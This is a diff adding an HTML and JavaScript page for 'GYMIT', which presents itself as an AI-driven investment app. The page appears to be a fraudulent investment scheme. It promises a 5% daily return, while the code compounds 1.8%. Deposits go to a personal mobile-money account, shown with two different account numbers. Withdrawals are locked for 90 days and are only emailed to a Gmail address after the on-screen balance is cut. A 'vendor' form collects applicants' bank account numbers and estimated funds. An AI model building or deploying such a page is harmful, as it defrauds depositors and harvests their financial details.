@@ -1,0 +1,860 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GYMIT - Grow Your Money Investment Team</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+
+        :root {
+            --gold: #FFD700;
+            --black: #000000;
+            --silver: #C0C0C0;
+            --dark-charcoal: #333333;
+            --light-gray: #f2f2f2;
+            --light-green: #4CAF50;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: var(--black);
+            color: var(--light-gray);
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; /* Align to top */
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 95%;
+            max-width: 420px;
+            background: linear-gradient(145deg, var(--dark-charcoal), #1a1a1a);
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            padding: 30px;
+            transition: transform 0.5s;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            color: var(--gold);
+            font-size: 2.5rem;
+            font-weight: 700;
+            text-shadow: 0 0 10px var(--gold);
+        }
+
+        .header p {
+            color: var(--silver);
+            font-size: 1rem;
+        }
+
+        .user-id-display {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 0.8rem;
+            color: var(--silver);
+            word-wrap: break-word;
+        }
+
+        .balance-card {
+            background: linear-gradient(to right, var(--gold), var(--silver));
+            padding: 25px;
+            border-radius: 15px;
+            text-align: center;
+            /* removed margin-bottom to connect with expected return card */
+            color: var(--black);
+            position: relative;
+            overflow: hidden;
+            border-bottom-left-radius: 0;
+            border-bottom-right-radius: 0;
+        }
+
+        .balance-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: conic-gradient(transparent, rgba(255, 255, 255, 0.1), transparent 30%);
+            animation: rotate 4s linear infinite;
+        }
+
+        @keyframes rotate {
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .balance-card h2 {
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+        }
+
+        .balance-card #balance {
+            font-size: 2.8rem;
+            font-weight: 700;
+        }
+
+        /* --- NEW: Expected Return Card --- */
+        .expected-return-card {
+            background: #2a2a2a;
+            color: var(--light-gray);
+            padding: 15px 25px;
+            text-align: center;
+            border-top: 2px solid rgba(0,0,0,0.2);
+            border-bottom-left-radius: 15px;
+            border-bottom-right-radius: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .expected-return-card h3 {
+            font-size: 0.9rem;
+            color: var(--silver);
+            font-weight: 400;
+            margin-bottom: 5px;
+        }
+        
+        .expected-return-card #expected-return {
+            font-size: 1.5rem;
+            color: var(--light-green);
+            font-weight: 600;
+            text-shadow: 0 0 5px var(--light-green);
+        }
+
+        .countdown-container {
+            background: #1e1e1e;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            text-align: center;
+            border: 1px solid var(--gold);
+        }
+        .countdown-container h3 {
+            color: var(--silver);
+            font-size: 0.9rem;
+            margin-bottom: 10px;
+            font-weight: 400;
+        }
+        #withdrawal-countdown {
+            color: var(--gold);
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
+
+        .actions {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .actions .btn-full {
+             grid-column: span 2;
+        }
+
+        .btn {
+            background: var(--gold);
+            color: var(--black);
+            border: none;
+            padding: 12px 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn::after {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.2);
+            top: 0;
+            left: -100%;
+            transition: all 0.4s ease;
+        }
+
+        .btn:hover::after {
+            left: 0;
+        }
+
+        .btn.silver {
+            background: var(--silver);
+        }
+        
+        .btn.charcoal {
+            background: var(--dark-charcoal);
+            color: var(--silver);
+            border: 1px solid var(--gold);
+        }
+
+
+        .page {
+            display: none;
+            padding: 20px;
+            background: var(--dark-charcoal);
+            border-radius: 15px;
+            margin-top: 20px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .page h3 {
+            color: var(--gold);
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            color: var(--silver);
+            margin-bottom: 5px;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid var(--silver);
+            background: #2a2a2a;
+            color: var(--light-gray);
+            font-size: 1rem;
+        }
+
+        /* --- NEW: Deposit Return Preview --- */
+        .deposit-preview {
+            background: #1e1e1e;
+            padding: 10px 15px;
+            border-radius: 8px;
+            margin-top: -10px; /* pull it closer to the input */
+            margin-bottom: 20px;
+            text-align: center;
+            transition: all 0.3s ease;
+            height: 0;
+            overflow: hidden;
+            opacity: 0;
+        }
+        .deposit-preview.visible {
+            height: 60px; /* Adjust as needed */
+            opacity: 1;
+        }
+
+        .deposit-preview p {
+            font-size: 0.8rem;
+            color: var(--silver);
+        }
+
+        .deposit-preview #deposit-return-amount {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: var(--light-green);
+        }
+
+
+        .info-box {
+            background: #2a2a2a;
+            padding: 15px;
+            border-radius: 8px;
+            color: var(--silver);
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .history-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #444;
+            color: var(--silver);
+        }
+
+        .history-item:last-child {
+            border-bottom: none;
+        }
+        
+        .history-details span:first-child {
+            display: block;
+            font-weight: 500;
+        }
+        
+        .history-details .date {
+            font-size: 0.75rem;
+            color: #888;
+        }
+        
+        .history-amount {
+             font-weight: 600;
+        }
+
+        .tsi-info, .terms-content {
+            background: #2a2a2a;
+            padding: 20px;
+            border-radius: 15px;
+            margin-top: 20px;
+        }
+
+        .tsi-info h3, .terms-content h3 {
+            color: var(--gold);
+            margin-bottom: 15px;
+        }
+
+        .tsi-info p, .terms-content p, .terms-content li {
+            color: var(--silver);
+            line-height: 1.6;
+            font-size: 0.9rem;
+            margin-bottom: 10px;
+        }
+        
+        .terms-content ul {
+            padding-left: 20px;
+        }
+        
+        .vendor-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .vendor-link button {
+             background: none;
+             border: none;
+             color: var(--gold);
+             text-decoration: underline;
+             cursor: pointer;
+             font-size: 1rem;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <h1>GYMIT</h1>
+            <p>GROW YOUR MONEY INVESTMENT TEAM</p>
+        </div>
+
+        <div class="user-id-display">
+            Your User ID: <span id="user-id-placeholder">loading...</span>
+        </div>
+
+        <div class="balance-card">
+            <h2>Your Balance</h2>
+            <p id="balance">₦0.00</p>
+        </div>
+        
+        <!-- NEW: Expected Return Display -->
+        <div class="expected-return-card">
+            <h3>Expected Return After 90 Days</h3>
+            <p id="expected-return">₦0.00</p>
+        </div>
+
+        <div class="countdown-container" id="countdown-wrapper" style="display: none;">
+            <h3>Withdrawal Unlocks In</h3>
+            <div id="withdrawal-countdown">-- Days --:--:--</div>
+        </div>
+
+        <div class="actions">
+            <button class="btn" onclick="showPage('deposit')">Deposit</button>
+            <button class="btn silver" onclick="checkWithdrawalEligibility()">Withdraw</button>
+            <button class="btn charcoal btn-full" onclick="showPage('history')">Transaction History</button>
+            <button class="btn charcoal btn-full" onclick="showPage('terms')">Terms & Conditions</button>
+        </div>
+
+        <div id="deposit" class="page">
+            <h3>Request Deposit</h3>
+            <div class="info-box">
+                <p>Send payment to:</p>
+                <p><strong>6102420471 - Opay</strong></p>
+                <p><strong>Samuel Ugonna</strong></p>
+                <p>(Nearest Verified GYMIT Vendor)</p>
+            </div>
+            <div class="form-group">
+                <label for="deposit-amount">Amount (₦)</label>
+                <input type="number" id="deposit-amount" placeholder="Enter amount you sent">
+            </div>
+            
+            <!-- NEW: Live Deposit Return Preview -->
+            <div id="deposit-return-preview" class="deposit-preview">
+                <p>Expected return for this deposit:</p>
+                <span id="deposit-return-amount"></span>
+            </div>
+
+            <button class="btn" style="width: 100%;" onclick="requestDeposit()">Confirm & Request Deposit</button>
+        </div>
+
+        <div id="withdraw" class="page">
+            <h3>Request Withdrawal</h3>
+            <div class="info-box">
+                <p>Withdrawal is available after 90 days of initial investment.</p>
+                <p>A 5% daily return is added to your balance.</p>
+            </div>
+            <form id="withdrawal-form">
+                <div class="form-group">
+                    <label for="bank-name">Bank Name</label>
+                    <input type="text" id="bank-name" required>
+                </div>
+                <div class="form-group">
+                    <label for="account-name">Bank Account Name</label>
+                    <input type="text" id="account-name" required>
+                </div>
+                <div class="form-group">
+                    <label for="account-number">Bank Account Number</label>
+                    <input type="number" id="account-number" required>
+                </div>
+                <div class="form-group">
+                    <label for="withdraw-amount">Amount to Withdraw (₦)</label>
+                    <input type="number" id="withdraw-amount" required>
+                </div>
+                <button type="submit" class="btn silver" style="width: 100%;">Send Withdraw Request</button>
+            </form>
+        </div>
+
+        <div id="history" class="page">
+            <h3>Transaction History</h3>
+            <div id="history-list">
+                <div class="history-item">
+                    <span>No transactions yet.</span>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+        
+        <div id="terms" class="page">
+            <h3>Terms & Conditions</h3>
+            <div class="terms-content">
+                <ul>
+                    <li>Vendor is not responsible for your withdrawal payment it will be made directly to your bank account by GYMIT. This is an international transaction and may take 3 to 5 working days to arrive in your bank account.</li>
+                    <li>Deposit should be made in your local currency, GYMIT app detects your country ,so investment should be done in the currency of the country you are currently reciding.</li>
+                    <li>Nearest Verified GYMIT Vendor makes your deposit easier by facilitating of easy transaction so your investment plan can proceed as soon as possible.</li>
+                   <li>For inquiries , complaints or partnership,send email to GYMIT on upcoinexchangeupc@gmail.com.</li>
+                    <li>Your investment will grow for 90 days before withdrawal is available.</li>
+                </ul>
+            </div>
+        </div>
+        
+        <div id="vendor-application" class="page">
+            <h3>Become a Verified Vendor</h3>
+            <div class="info-box">
+                <p>Fill the form below to apply. Our team will review your application and get back to you shortly.</p>
+            </div>
+            <form id="vendor-form">
+                <div class="form-group">
+                    <label for="vendor-name">Full Name</label>
+                    <input type="text" id="vendor-name" required>
+                </div>
+                 <div class="form-group">
+                    <label for="vendor-country">Country</label>
+                    <input type="text" id="vendor-country" required>
+                </div>
+                <div class="form-group">
+                    <label for="vendor-location">Location (City/State)</label>
+                    <input type="text" id="vendor-location" required>
+                </div>
+                <div class="form-group">
+                    <label for="vendor-bank-name">Bank Name</label>
+                    <input type="text" id="vendor-bank-name" required>
+                </div>
+                <div class="form-group">
+                    <label for="vendor-account-number">Bank Account Number</label>
+                    <input type="number" id="vendor-account-number" required>
+                </div>
+                <div class="form-group">
+                    <label for="vendor-estimated-funds">Estimated Amount in Bank Account (e.g., $1000 - $5000)</label>
+                    <input type="text" id="vendor-estimated-funds" required placeholder="Provide a range">
+                </div>
+                <button type="submit" class="btn" style="width: 100%;">Apply Now</button>
+            </form>
+        </div>
+
+        <!-- UPGRADED: TSI & Diversification Info -->
+        <div class="tsi-info">
+            <h3>Our Strategy: AI-Powered Global Diversification</h3>
+            <p>At GYMIT, we leverage cutting-edge <strong>Artificial Intelligence (AI)</strong> to analyze market trends and diversify your investments across a dynamic, global portfolio. Our investments span multiple sectors to ensure robust growth and stability, including high-potential <strong>cryptocurrency</strong>, blue-chip and emerging <strong>stocks</strong>, vital <strong>telecommunications</strong> infrastructure, the essential <strong>food and agriculture</strong> industry, and global <strong>transport and logistics</strong> networks. Our AI works in tandem with the <strong>True Strength Index (TSI)</strong>, a powerful momentum oscillator, to identify overbought and oversold conditions across these diverse assets. This dual-strategy allows for highly strategic entry and exit points, aiming to maximize returns while intelligently managing risk.</p>
+        </div>
+        
+        <div class="vendor-link">
+            <button onclick="showPage('vendor-application')">Become a Verified Vendor</button>
+        </div>
+    </div>
+
+    <script type="module">
+        // Import the necessary functions from the Firebase SDKs
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+        import { getDatabase, ref, onValue, set, push, update } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCnemu_76jHDeqACbpWieiTk5kmjSD7lgI",
+            authDomain: "lovebooks-a24aa.firebaseapp.com",
+            projectId: "lovebooks-a24aa",
+            storageBucket: "lovebooks-a24aa.firebasestorage.app",
+            messagingSenderId: "94822981017",
+            appId: "1:94822981017:web:f4888c40aec01fc7b68708",
+            databaseURL: "https://lovebooks-a24aa-default-rtdb.firebaseio.com/"
+        };
+
+        // Initialize Firebase and get a reference to the database service
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        /**
+         * --- User Authentication ---
+         * Gets the user's unique ID from local storage.
+         * If it's a new user, it generates a unique ID, saves it, and returns it.
+         * This ensures each user has a persistent, unique identity in their browser.
+         * @returns {string} The unique user ID.
+         */
+        function getOrCreateUserId() {
+            let currentUserId = localStorage.getItem('gymitUserId');
+            if (!currentUserId) {
+                currentUserId = 'gymit-user-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
+                localStorage.setItem('gymitUserId', currentUserId);
+            }
+            return currentUserId;
+        }
+
+        const userId = getOrCreateUserId(); 
+        document.getElementById('user-id-placeholder').textContent = userId;
+
+        // --- Get DOM Elements ---
+        const balanceElement = document.getElementById('balance');
+        const expectedReturnElement = document.getElementById('expected-return'); // NEW
+        const historyListElement = document.getElementById('history-list');
+        const countdownWrapper = document.getElementById('countdown-wrapper');
+        const countdownElement = document.getElementById('withdrawal-countdown');
+        const depositAmountInput = document.getElementById('deposit-amount'); // NEW
+        const depositReturnPreview = document.getElementById('deposit-return-preview'); // NEW
+        const depositReturnAmount = document.getElementById('deposit-return-amount'); // NEW
+        
+        const userRef = ref(database, 'users/' + userId);
+
+        let dataLoaded = false; 
+        let countdownInterval; 
+        let withdrawalUnlockTime;
+
+        /**
+         * --- NEW: Compounded Return Calculator ---
+         * Calculates the final amount after a period of compounded daily interest.
+         * @param {number} principal - The initial amount.
+         * @param {number} dailyRate - The daily interest rate (e.g., 0.018 for 5%).
+         * @param {number} days - The number of days to compound.
+         * @returns {number} The final calculated amount.
+         */
+        function calculateExpectedReturn(principal, dailyRate = 0.018, days = 90) {
+            if (principal <= 0) return 0;
+            // The formula for compound interest is P(1 + r)^t
+            return principal * Math.pow(1 + dailyRate, days);
+        }
+
+        /**
+         * --- Helper to format currency ---
+         * @param {number} amount - The number to format.
+         * @returns {string} Formatted currency string.
+         */
+        function formatCurrency(amount) {
+            return `₦${amount.toLocaleString('en-NG', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+        }
+
+
+        /**
+         * --- Main Data Listener ---
+         * This function listens for any changes in the user's data in Firebase 
+         * and updates the UI in real-time.
+         */
+        onValue(userRef, (snapshot) => {
+            if (!snapshot.exists()) {
+                const now = new Date().toISOString();
+                set(userRef, {
+                    balance: 0,
+                    createdAt: now,
+                    lastDailyBonusTimestamp: now 
+                });
+                return;
+            }
+
+            const userData = snapshot.val();
+            
+            if (!dataLoaded) {
+                 applyDailyBonus(userId, userData);
+                 dataLoaded = true;
+            }
+            
+            setupWithdrawalCountdown(userData.createdAt);
+
+            const currentBalance = userData.balance || 0;
+            balanceElement.textContent = formatCurrency(currentBalance);
+
+            // --- NEW: Calculate and display expected 90-day return ---
+            const expectedReturn = calculateExpectedReturn(currentBalance);
+            expectedReturnElement.textContent = formatCurrency(expectedReturn);
+
+            historyListElement.innerHTML = ''; 
+            
+            if (userData.history) {
+                const sortedHistory = Object.values(userData.history).sort((a, b) => new Date(b.date) - new Date(a.date));
+                
+                for (const item of sortedHistory) {
+                    const historyItem = document.createElement('div');
+                    historyItem.classList.add('history-item');
+                    
+                    let amountColor = 'var(--silver)';
+                    let sign = '';
+                    
+                    if (item.type === 'Deposit') {
+                        amountColor = 'lightgreen';
+                        sign = '+';
+                    } else if (item.type === 'Withdrawal') {
+                        amountColor = 'salmon';
+                        sign = '-';
+                    } else if (item.type === 'Daily 5% Bonus') {
+                        amountColor = 'var(--gold)';
+                        sign = '+';
+                    }
+
+                    historyItem.innerHTML = `
+                        <div class="history-details">
+                           <span>${item.type}</span>
+                           <span class="date">${new Date(item.date).toLocaleString('en-NG')}</span>
+                        </div>
+                        <span class="history-amount" style="color: ${amountColor};">
+                            ${sign}${formatCurrency(item.amount)}
+                        </span>
+                    `;
+                    historyListElement.appendChild(historyItem);
+                }
+            } else {
+                 historyListElement.innerHTML = '<div class="history-item"><span>No transactions yet.</span><span></span></div>';
+            }
+        });
+
+        /**
+         * --- Daily Bonus Logic ---
+         */
+        async function applyDailyBonus(userId, userData) {
+            const lastBonusTimestamp = userData.lastDailyBonusTimestamp || userData.createdAt;
+            let lastBonusDate = new Date(lastBonusTimestamp);
+            const currentDate = new Date();
+            lastBonusDate.setHours(0, 0, 0, 0);
+            
+            if (!userData.balance || userData.balance <= 0) return; 
+
+            let tempDate = new Date(lastBonusDate);
+            tempDate.setHours(0,0,0,0);
+
+            const updates = {};
+            let newCalculatedBalance = userData.balance;
+            let bonusApplied = false;
+
+            while(tempDate < currentDate) {
+                const dailyBonusAmount = newCalculatedBalance * 0.018;
+                if(dailyBonusAmount > 0){
+                    newCalculatedBalance += dailyBonusAmount;
+                    const bonusDate = new Date(tempDate);
+                    bonusDate.setDate(bonusDate.getDate() + 1);
+                    const newHistoryItemRef = push(ref(database, `/users/${userId}/history`));
+                    updates[`/users/${userId}/history/${newHistoryItemRef.key}`] = {
+                        type: 'Daily 5% Bonus',
+                        amount: parseFloat(dailyBonusAmount.toFixed(2)),
+                        date: bonusDate.toISOString()
+                    };
+                    bonusApplied = true;
+                }
+                tempDate.setDate(tempDate.getDate() + 1);
+            }
+            
+            if (bonusApplied) {
+                updates[`/users/${userId}/balance`] = parseFloat(newCalculatedBalance.toFixed(2));
+                updates[`/users/${userId}/lastDailyBonusTimestamp`] = new Date().toISOString();
+                await update(ref(database), updates);
+                console.log("Daily bonuses applied successfully.");
+            }
+        }
+        
+        /**
+         * --- Withdrawal Countdown Logic ---
+         */
+        function setupWithdrawalCountdown(creationDateStr) {
+            if (!creationDateStr) return;
+            const creationDate = new Date(creationDateStr);
+            withdrawalUnlockTime = new Date(creationDate.getTime());
+            withdrawalUnlockTime.setDate(creationDate.getDate() + 90);
+            countdownWrapper.style.display = 'block';
+            if(countdownInterval) clearInterval(countdownInterval);
+            countdownInterval = setInterval(() => {
+                const now = new Date().getTime();
+                const distance = withdrawalUnlockTime - now;
+                if (distance < 0) {
+                    clearInterval(countdownInterval);
+                    countdownElement.innerHTML = "Withdrawal Unlocked!";
+                    countdownElement.style.color = 'var(--light-green)';
+                    return;
+                }
+                const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+                countdownElement.innerHTML = `${days}d : ${hours}h : ${minutes}m : ${seconds}s`;
+            }, 1000);
+        }
+        
+        /**
+         * --- Conditional Withdrawal Check ---
+         */
+        window.checkWithdrawalEligibility = function() {
+            const now = new Date().getTime();
+            if (withdrawalUnlockTime && now < withdrawalUnlockTime) {
+                const distance = withdrawalUnlockTime - now;
+                const days = Math.ceil(distance / (1000 * 60 * 60 * 24));
+                alert(`Please wait. ${days} day(s) remaining before withdrawal can commence. Thanks.`);
+            } else {
+                showPage('withdraw');
+            }
+        }
+
+        /**
+         * --- Page Navigation ---
+         */
+        window.showPage = function(pageId) {
+            document.querySelectorAll('.page').forEach(page => page.style.display = 'none');
+            const pageToShow = document.getElementById(pageId);
+            if(pageToShow) pageToShow.style.display = 'block';
+        }
+        
+        /**
+         * --- NEW: Live Deposit Preview Listener ---
+         */
+        depositAmountInput.addEventListener('input', (e) => {
+            const amount = parseFloat(e.target.value);
+            if (amount && amount > 0) {
+                const expectedReturn = calculateExpectedReturn(amount);
+                depositReturnAmount.textContent = formatCurrency(expectedReturn);
+                depositReturnPreview.classList.add('visible');
+            } else {
+                depositReturnPreview.classList.remove('visible');
+            }
+        });
+
+
+        /**
+         * --- Deposit Request Functionality ---
+         */
+        window.requestDeposit = function() {
+            const amount = document.getElementById('deposit-amount').value;
+            if (!amount || amount <= 0) {
+                alert("Please enter a valid amount.");
+                return;
+            }
+            const recipientEmail = "upcoinexchangeupc@gmail.com";
+            const subject = "GYMIT Deposit Request";
+            const body = `A user has requested to deposit ₦${amount}. They have confirmed sending the payment to the verified vendor: 7025334855 Opay (Samuel Ugonna Ihekwoaba).\n\nPlease verify this transaction and credit the user's account.\n\nUser ID: ${userId}`;
+            window.location.href = `mailto:${recipientEmail}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+            alert("Your deposit request has been prepared. Please complete sending the email from your mail app. The admin will credit your account after payment verification.");
+            document.getElementById('deposit-amount').value = '';
+            depositReturnPreview.classList.remove('visible'); // Hide preview
+            showPage('none'); 
+        }
+
+        /**
+         * --- Withdrawal Request Functionality ---
+         */
+        document.getElementById('withdrawal-form').addEventListener('submit', async function(e) {
+            e.preventDefault(); 
+            const bankName = document.getElementById('bank-name').value;
+            const accountName = document.getElementById('account-name').value;
+            const accountNumber = document.getElementById('account-number').value;
+            const amount = parseFloat(document.getElementById('withdraw-amount').value);
+            const currentBalance = parseFloat(balanceElement.textContent.replace(/[₦,]/g, ''));
+
+            if (amount > currentBalance) {
+                alert("Insufficient balance for this withdrawal.");
+                return;
+            }
+             if (!bankName || !accountName || !accountNumber || !amount || amount <= 0) {
+                alert("Please fill all fields correctly.");
+                return;
+            }
+
+            const newBalance = currentBalance - amount;
+            const updates = {};
+            updates[`/users/${userId}/balance`] = newBalance;
+            const newHistoryItemRef = push(ref(database, `/users/${userId}/history`));
+            updates[`/users/${userId}/history/${newHistoryItemRef.key}`] = {
+                type: 'Withdrawal',
+                amount: amount,
+                date: new Date().toISOString()
+            };
+            await update(ref(database), updates);
+
+            const recipientEmail = "upcoinexchangeupc@gmail.com";
+            const subject = "GYMIT Withdrawal Request";
+            const body = `A user has requested a withdrawal. The amount has been deducted from their dashboard balance. Please process the payment.\n\n--- Request Details ---\n\nUser ID: ${userId}\nBank Name: ${bankName}\nAccount Name: ${accountName}\nAccount Number: ${accountNumber}\nAmount: ${formatCurrency(amount)}`;
+            window.location.href = `mailto:${recipientEmail}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+            alert("Your withdrawal request has been sent to the admin. The amount has been deducted from your balance.");
+            document.getElementById('withdrawal-form').reset();
+            showPage('none'); 
+        });
+        
+        /**
+         * --- Vendor Application Email Functionality ---
+         */
+        document.getElementById('vendor-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const name = document.getElementById('vendor-name').value;
+            const country = document.getElementById('vendor-country').value;
+            const location = document.getElementById('vendor-location').value;
+            const bankName = document.getElementById('vendor-bank-name').value;
+            const accountNumber = document.getElementById('vendor-account-number').value;
+            const estimatedFunds = document.getElementById('vendor-estimated-funds').value;
+
+            const recipientEmail = "upcoinexchangeupc@gmail.com";
+            const subject = "GYMIT Vendor Application";
+            const body = `A new vendor application has been submitted.\n\n--- Applicant Details ---\n
+User ID: ${userId}
+Full Name: ${name}
+Country: ${country}
+Location: ${location}
+Bank Name: ${bankName}
+Bank Account Number: ${accountNumber}
+Estimated Funds in Account: ${estimatedFunds}
+\n--- End of Application ---`;
+
+            window.location.href = `mailto:${recipientEmail}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+            alert("Your application has been prepared for sending. Please complete sending the email from your mail application. Our team will get back to you shortly.");
+            document.getElementById('vendor-form').reset();
+            showPage('none'); 
+        });
+
+    </script>
+</body>
+</html>
